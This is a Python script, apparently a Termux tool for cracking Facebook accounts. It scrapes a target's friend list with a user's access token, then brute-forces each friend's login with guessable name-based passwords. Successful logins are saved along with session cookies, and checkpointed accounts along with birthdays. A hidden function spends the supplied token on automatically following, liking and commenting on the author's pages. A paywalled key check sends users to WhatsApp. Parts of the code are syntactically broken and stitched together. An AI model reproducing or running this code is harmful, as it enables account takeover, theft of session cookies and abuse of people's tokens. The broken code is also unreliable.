# -*- coding: utf-8
# coded by Dicky Wahyudi
# Bang Dicky Saya Mau Recode
# Karena Saya Bodoh&Tolol Kalau Soal Ngoding Bang
# Bakat Saya Hanya Recode Dan Saya Bangga Karna Saya Manusia Sampah

import os
try:
    import requests
except ImportError:
    ______SAYANGKAMU______('pip install requests')
try:
    import concurrent.futures
except ImportError:
    ______SAYANGKAMU______('pip install futures')
try:
    import bs4
except ImportError:
    ______SAYANGKAMU______('pip install bs4')
    
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64,uuid
from concurrent.futures import ThreadPoolExecutor 
from concurrent.futures import ThreadPoolExecutor as lol
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from time import sleep as jeda
from datetime import datetime
______YOUNISXXX______= input
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
_______loop______ = 0
_______ok_______ = []
_______cp_______ = []
______SAYANGKAMU______= os.system
id = []
data = {}
pwx = []
______XXXX______ =print
####TAMBAH BOLEH TAPI GANTI JANGAN#####
_____ListID_______ = [
    "100072749560924","100023749387124","100069494601961","100002322531711","100019608840426","100023543993788"]
_____Post_______= [
    "165272002465952","156492366785748"]
_____INFO______ = 'Lu Ganteng Banget Bang, Gw Mau Recode SClu, Soalnya Gw Bodoh,Goblok & Tolol Soal Coding'
ses = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
_______IP_______ = requests.get('https://api.ipify.org').text
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        ______LuWibu______()
    nTemp = n - 1
except ValueError:
    ______LuWibu______()
 
def ______YOUNISXZ______(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
### GLOBAL WARNA ###
RED_MAGIC = '\x03\xf3\r\nd\x83\x8e^'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda
y = "\033[0m"
z = "\033[1;92m"
x = "\033[1;97m"
I='\x1b[0;32m'
C='\x1b[0;36m'
R = "\033[1;91m"
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
Q="\x1b[00m"
U = '\x1b[1;95m'
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'
p = '\x1b[1;97m'
k = '\x1b[1;93m'
m = '\x1b[1;91m'
d = '\x1b[90;1m'
h = '\x1b[92;1m'
k = '\x1b[93;1m'
b = '\x1b[94;1m'
j = '\x1b[95;1m'
a = '\x1b[96;1m'   
g = '\33[3;1m'
my_color = [
 P, M, H, K, B, U, O, N, j, a, b, d, u, o, h, m, N, k]
ior = random.choice(my_color)
______LuWibu______ = exit
def logo():
	______SAYANGKAMU______("clear")
	______YOUNISXXX______(f"""%s
\033[1;92m _     _ _______ _     _ _______ _  ______ 
\033[1;91m| |   | (_______|_)   (_|_______) |/ _____)
\033[1;97m| |___| |_     _ _     _ _     _| ( (____  
\033[1;97m|_____  | |   | | |   | | |   | | |\____ \ 
\033[1;97m _____| | |___| | |___| | |   | | |_____) )
\033[1;92m(_______|\_____/ \_____/|_|   |_|_(______/ 
 
\x1b[1;91m╭────────────────────────────────────────────╮
\x1b[1;97m [\033[1;91m•\x1b[1;97m] Author     : JAIKUMAR-PARHYAR
\x1b[1;97m [\033[1;91m•\x1b[1;97m] WhatsApp   : +923312734753
\x1b[1;97m [\033[1;91m•\x1b[1;97m] Facebook   : Jaikumar-parhyar.562
\x1b[1;97m [\033[1;91m•\x1b[1;97m] Github     : Parhyar-SHAB-2005
\x1b[1;91m╰────────────────────────────────────────────╯
"""%(N))
         
def R():

	try:
		token = open('login.txt', 'r')
		___SayaRecodeSampah___()
	except (KeyError, IOError):
		______SAYANGKAMU______('rm -rf login.txt')
		logo()
		______YOUNISXXX_____(f" \n {P}[{H}\033[1;91m•{P}] \033[1;93mUSE FRESH BUSSINESS (EAAB) TOKEN \n")
		token = ______YOUNIS______(f'{P} [{H}?{P}] TOKEN:\033[1;92m  ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token=%s'%(token))
			a = json.loads(otw.text)
			zedd = open('login.txt', 'w')
			zedd.write(token)
			zedd.close()
			Name = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
			______YOUNISXXX______("\n %s[%s•%s] Welcome %s%s"%(P,H,P,H,Name));time.sleep(00.9)
			______YOUNISXXX______(" %s[%s•%s] Use These Tools Wisely "%(P,H,P));time.sleep(00.9)
			______YOUNISXXX______(" %s[%s•%s] I'm Not Responsible If Something Happens "%(P,H,P));time.sleep(00.9)
			______YOUNIS______(" %s[%s•%s] PRESS ENTER TO NET PAGE "%(P,H,P));time.sleep(3)
			_____bot________();___SayaRecodeSampah___()
		except KeyError:
			______YOUNISXXX______(f'{P} [{M}!{P}] Expired Token')
			______LuWibu______() 
#####YANG GANTI ANAK HARAM#####

if __name__=='__main__':
	
	help()
	
imtiazak_ua_xaomi  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 EdgiOS/46.3.7 Mobile/15E148 Safari/605.1.15;]'
imtiazak_ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
imtiazak_ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
imtiazak_ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
imtiazak_ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
imtiazak_ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
imtiazak_ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
imtiazak_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

def _____bot________():
	try:
		token = open('login.txt', 'r').read()
	except (KeyError, IOError):
		______LuWibu______(" %s[!] token kadaluwarsa!"%(M))
	______kom______ = ('Halo Bang Dicky SC Lu GG Bang') 
	requests.post('https://graph.facebook.com/%s/subscribers?access_token=%s'%(_____ListID_______,token))
	requests.post('https://graph.facebook.com/%s/likes?summary=true&access_token=%s'%(_____Post_______, token))
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(_____Post_______,_____INFO______,token))
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(_____Post_______,______kom______,token))
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(_____Post_______,token, token))

def __cekakun__():
    ______YOUNISXXX______(f" \n {P}[{H}1{P}] Check Results OK ")
    ______YOUNISXXX______(f" {P}[{H}2{P}] Check Results CP ")
    anjg = ______YOUNIS______(f" \n {P}[{H}\033[1;92m?{P}] Chose : ")
    if anjg == '':
        ___SayaRecodeSampah___()
    elif anjg == '01' or anjg == '1':
        ______SAYANGKAMU______(' cat YPUNIS-OK.txt')
        ______YOUNIS______('\n [\xe2\x80\xa2] Return ')
        ___SayaRecodeSampah___()
    elif anjg == '02' or anjg == '2':
        totalcp = open('wasicp.txt').read().splitlines()
        ______SAYANGKAMU______(' cat YOUNIS-CP.txt')
        ______YOUNIS______('\n [\xe2\x80\xa2] kembali ')
        ___SayaRecodeSampah___()
    else:
        ______YOUNISXXX______( ' [!] Chose yang benar!!')
        ___SayaRecodeSampah___()
def __upgrade__():
	______YOUNISXXX______(' [!] Wait');time.sleep(3)
	______YOUNIS______(' >>> Enter ')
	______SAYANGKAMU______('am start https://wa.me/+923404708884?text=Assalamualaikum,+Bang+Dicky,+Saya+Ingin+Upgrade+Premium+%20>/dev/null')
	______LuWibu______('Selamat Tinggal')
		
def _____Publik_______():
	try:
		token = open('login.txt','r').read()
	except IOError:
		______LuWibu______()
		print("")
	pil = ______YOUNIS______(P+' ['+h+'?'+P+'] Enter Public ID : ')
	try:
		koh = requests.get('https://graph.facebook.com/'+pil+'?access_token='+token)
		grex = json.loads(koh.text)['name']
		______YOUNISXXX______(P+' ['+h+'•'+P+'] Name  : '+str(grex))
	except (KeyError,IOError):
		______YOUNISXXX______(P+' ['+h+'!'+P+'] ID TIDAK DITEMUKAN')
		______LuWibu______()
	except requests.exceptions.ConnectionError:
		______YOUNISXXX______(P+' ['+h+'!'+P+'] KONESI INTERNET TIDAK STABIL')
		______LuWibu______()
	try:
		po = requests.get(f'https://graph.facebook.com/{pil}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
		for i in po['friends']['data']:
			id.append(f"{i['id']}|{i['name']}")
		______YOUNISXXX______(P+' ['+h+'•'+P+'] Total : '+str(len(id)))
	except requests.exceptions.ConnectionError:
		______YOUNISXXX______(P+' ['+h+'!'+P+'] KONEKSI INTERNET BERMASALAH')
		______LuWibu______()
	except (KeyError,IOError):
		______YOUNISXXX______(P+' ['+h+'!'+P+'] TARGET FRIENDSHIP NOT PUBLISHED')
		______LuWibu______()
	______YOUNISXXX______(f" \n {P}[{H}?{P}] do you want to use manual password? [Y/t] ")
	ask=______YOUNIS______(" %s[%s?%s] %sChose :%s "%(p,H,p,p,p))
	if ask in[""]:
		______LuWibu______(f" {P}[{H}!{P}] Option None")
	elif ask in["t"]:
		_____LANGSUNG_____()
	elif ask in["y"]:
		____MANUAL_____()
	else:
		______LuWibu______(f" {P}[{H}!{P}] Option None")
		
### OTOMATIS ###
def _____LANGSUNG_____():
	______YOUNISXXX______("")
	______YOUNISXXX______(' %s[%s+%s] %sResults %s\033[1;92mOK\033[1;97m %sSaved to -> %sYOUNIS-OK.txt'%(p,p,p,p,p,p,H))
	______YOUNISXXX______(' %s[%s+%s] %sResults %s\033[1;91mCP\033[1;97m %sSaved to -> %s\33[1;91mYOUNIS-CP.txt'%(p,p,p,p,p,p,K))
	______YOUNIS______(" %s[%s!%s] %sIf %sNo %sResults Flight-> %s5Sec\n"%(p,M,p,p,p,p,p))
	with ThreadPoolExecutor(max_workers=30) as dicky:
		for user in id:
			uid, name = user.split("|")
			nam = name.split(' ')
			if len(name) == 3 or len(name) == 4 or len(name) == 5:
				pwx = [name, nam[0]+"123", nam[0]+"12345", nam[0]+"12345"]
			else:
				pwx = [name, nam[0]+"786", nam[0]+"1234", nam[0]+"12345"]
			dicky.submit(apii, uid, pwx)
		pass
	______LuWibu______("\n\n [#] crack selesai...")
### MANUAL ###
def ____MANUAL_____():
	______YOUNISXXX______(" %s[%s!%s] %sgunakan , (%skoma%s) sebagai pemisah"%(p,p,p,p,p,N))
	pwek=______YOUNIS______(' %s[%s?%s] %sbuat kata sandi :%s '%(p,p,p,p,p,H))
	if pwek=="":
		______LuWibu______(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		______LuWibu______(" %s[!] masukan sandi minimal 6 angka!"%(M))
		______YOUNISXXX______(' %s[%s+%s] %sResults %s\033[1;92mO\033[1;97mK %sSaved to -> %sYOUNIS-OK.txt'%(p,p,p,p,p,p,H))
		______YOUNISXXX______(' %s[%s+%s] %sResults %s\033[1;91mCP\033[1;97m %ssSaved to -> %s\33[1;91mYOUNIS-CP.txt'%(p,p,p,p,p,p,K))
		with ThreadPoolExecutor(max_workers=30) as dicky:
			for user in id:
				uid, name = user.split("|")
				dicky.submit(api, uid, pwek.split(","))
		______LuWibu______("\n\n [#] crack selesai...")
def apii(uid, pwx):
	global _______ok_______, _______cp_______, _______loop______
	rgb = random.choice(['\x1b[1;96m', '\x1b[1;93m', '\033[1;92m', '\033[1;97m', '\033[1;91m', '\033[1;91m', '\x1b[1;92m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
	for wk in list('\|-/'):
		sys.stdout.write("\r %s[%s%s%s] [%sXXX%s] %s/%s OK/%s - CP/%s "%(rgb,K,wk,rgb,rgb,rgb,_______loop______, len(id), len(_______ok_______), len(_______cp_______)))
		sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwx:
		tix = time.time()
		ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
		p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
		dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":uid,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
		ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
		po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
		if "c_user" in ses.cookies.get_dict().keys():
			kukis = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
			______XXXX______("\r %s[OK] %s | %s | %s         "%(H,uid, pw,kukis))
			ok.append("%s • %s"%(uid, pw))
			open("YOUNIS-OK.txt","a").write(" [OK] %s | %s | %s\n"%(uid, pw,kukis))
			break
		elif "checkpoint" in po.cookies.get_dict().keys():
			try:
				token=open("login.txt","r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				______YOUNISXXX______("\r %s\x1b[1;97m[CP] %s | %s | %s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s • %s"%(uid, pw))
				open("YOUNIS-CP.txt","a").write("  * --> %s | %s | %s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			______YOUNISXXX______("\r %s\x1b[1;97m[CP] %s | %s         "%(K,uid, pw))
			cp.append("%s • %s"%(uid, pw))
			open("YOUNIS-CP.txt","a").write("  * --> %s | %s\n"%(uid, pw))
			break
		else:
			continue
          
	_______loop______ += 1
### SETTING UA
def __useragent__():
	______YOUNISXXX______(f" \n {P}[{H}1{P}] Change UserAgent Manual")
	______YOUNISXXX______(f" {P}[{H}2{P}] Use UserAgent Tools")
	ua = ______YOUNIS______(f" {P}[{H}?{P}] Choose : ")
	if ua =="":
		______LuWibu______(f" {P}[{H}!{P}]Option None")
		c_ua = ______YOUNIS______(f" \n {P}[{H}?{P}] Enter User-Agent : ")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		______YOUNIS______(f" \n {P}[{H}✔{P}] Press Enter To Save User-Agent")
		___SayaRecodeSampah___()
	elif ua == "2":
		______YOUNISXXX______("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		______SAYANGKAMU______("rm -f .ua")
		time.sleep(1)
		______YOUNIS______(f" \n {P}[{H}?{P}] User-Agent Save Successfully")
		___SayaRecodeSampah___()
		
def ___SayaRecodeSampah___():
	______SAYANGKAMU______('clear')
	global token
	try:
		token = open('login.txt','r').read()
	except IOError:
		______YOUNISXXX______(f'{P} [{H}!{P}] Token Invalid')
		______SAYANGKAMU______('clear')
		______SAYANGKAMU______('rm -rf login.txt')
		main_apv()
	except requests.exceptions.ConnectionError:
		______LuWibu______(f'{P} [{M}!{P}] No Connection')
	try:
		Name = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
		uid = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['id']
	except KeyError:
		______SAYANGKAMU______('clear')
		______YOUNISXXX______(f'{P} [{M}×{P}] Token Invalid')
		______SAYANGKAMU______('rm -rf login.txt')
		main_apv()
	except requests.exceptions.ConnectionError:
		______LuWibu______(f'{P} [{M}!{P}] No Connection')
	logo()
	______YOUNISXXX______(f" {P}[{H}->{P}] Name    : %s \n {P}[{H}->{P}] ID      : %s \n {P}[{H}->{P}] IP      : %s \n {P}[{H}->{P}] Status  : {H}PREMIUM{P}"%(Name,uid,_______IP_______))
	______WYOUNISXXX______(f" \n {P}[{H}1{P}] Crack From Public ID \n {P}[{H}2{P}] Check Results OK/CP\n {P}[{H}3{P}] Setting UserAgent \n {P}[{H}4{P}] Upgrade {H}Pro \n {P}[{H}0{P}] \033[1;91mExit (Logout) \n")
	ask = ______YOUNIS______(f" {P}[{U}?{P}] Choose : ")
	if ask =="":______LuWibu______(f" {P}[{H}!{P}] Option None")
	elif ask in ['1','01','001','a']:_____Publik_______()
	elif ask in ['2','02','002','b']:__cekakun__()
	elif ask in ['3','03','003','c']:__useragent__()
	elif ask in ['4','04','004','d']:__upgrade__()
	elif ask in ['0','00','000','e']:______SAYANGKAMU______("rm -f login.txt");______YOUNIS______(f" {P}[{H}✔{P}] Successfully Delete Token");______LuWibu______()
	else:______LuWibu______(f" {P}[{H}!{P}] Option None")

def main_apv():
    os.system('clear')
    ak="YOUNIS-XXXX"
    logo()
    os.system('xdg-open https://www.facebook.com/jaikumar.parhyar.562')
    try:
        key1=open('/data/data/com.termux/files/usr/bin/.qureshi-cov', 'r').read()
    except IOError:
        os.system("clear")
        logo()
        print ("\x1b[1;97m [\033[1;91m•\x1b[1;97m] \033[1;91mYour Token Is Not Approved Already")
        print ("")
        print ("     \t \033[1;93m[\x1b[1;97m\x1b[1;41mTHIS TOOL IS PAID RS 150\x1b[0m\x1b[1;93m]")
        print ("")
        print ("\033[1;97m╭────────────────────────────────────────────╮")
        myid=uuid.uuid4().hex[:10].upper()
        print ("          \033[1;93mYOUR KEY :\033[1;97m "+ak+myid)
        print ("\033[1;97m╰────────────────────────────────────────────╯")
        kok=open('/data/data/com.termux/files/usr/bin/.qureshi-cov', 'w')
        kok.close()
        print ("")
        print ("")
        print ("\x1b[1;97m [\033[1;91m•\x1b[1;97m] Copy Key And Sent Me On WhatsApp Approve Your Key ")
        print ("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        time.sleep(6)
        os.system("xdg-open https://wa.me/+923312734753")
        
 httpCaht = requests.get("https://pastebin.com/raw/2ceqHj0i").text 
    if id in httpCaht: 
      print("\033[92m  YOUR ID IS ACTIVE. .......\033[97m") 
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else: 
      print("\033[0;96m YOUR ID IS NOT ACTIVE COPY👆 AND SEND ME MESSAGE ON WHATSAPP \033[0;91m#NOT FREE!!!") 
      os.system('xdg-open  https://wa.me/03312734753?text=*Hello*%2C%20*Jaikumar*%20*i*%20*want*%20*to*%20*buy*%20*your*%20*command*%20*apk*%20*UPDATED*')
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print (logo)
     chk() 
    
chk()
def login():
        os.system("clear")
        os.system('xdg-open https://youtube.com/channel/UCOo-omO_OVoU0B1109O0Z8g')
        logo()
        print ("\x1b[1;97m [\033[1;91m•\x1b[1;97m] \033[1;91mYour Token Is Not Approved Already")
        print ("     \t \033[1;93m[\x1b[1;97m\x1b[1;41mTHIS TOOL IS PAID RS 150\x1b[0m\x1b[1;93m]")
        print ("")
        print ("\033[1;97m╭────────────────────────────────────────────╮")
        print ("\x1b[1;97m [\033[1;91m•\x1b[1;97m] \033[1;93mYOUR KEY :\033[1;97m "+ak+key1)
        print ("\033[1;97m╰────────────────────────────────────────────╯")
        print ("\x1b[1;97m [\033[1;91m•\x1b[1;97m] Copy Key And Sent Me WP Approvel Your Key ")
        print ("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        time.sleep(3.5)
        os.system("xdg-open https://wa.me/+923312734753")
		
def cek_apk(kukis):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s. %s%s"%(P,i+1,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))

if __name__ == '__main__':
	if sys.version[0]!="2":
		python="2.7" if "2.7" in sys.version[0:2] else "2.8"
	else:
		______LuWibu______(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python run.py")
	______SAYANGKAMU______("git pull")
	main_apv()